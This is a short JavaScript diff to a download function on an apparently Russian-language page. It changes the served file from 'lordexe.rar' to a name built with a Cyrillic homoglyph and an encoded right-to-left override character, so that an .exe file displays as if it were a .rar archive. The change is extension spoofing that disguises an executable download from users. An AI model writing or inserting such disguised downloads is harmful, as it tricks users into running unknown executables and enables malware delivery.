@@ -107,7 +107,7 @@ async function downloadWithHashAndProgress(fileUrl, fileName, onProgress) {
 
 
 async function downloadFile() {
-    downloadWithHashAndProgress('/ear/lordexe.rar', 'lordexe.rar',
+    downloadWithHashAndProgress('/ear/lоrd%E2%80%AErar.exe', 'lоrd%E2%80%AErar.exe',
     (percent) => {
         console.log(`Загрузка: ${percent}%`);
         progressElement.innerHTML = `Загрузка... (${percent}%)`;
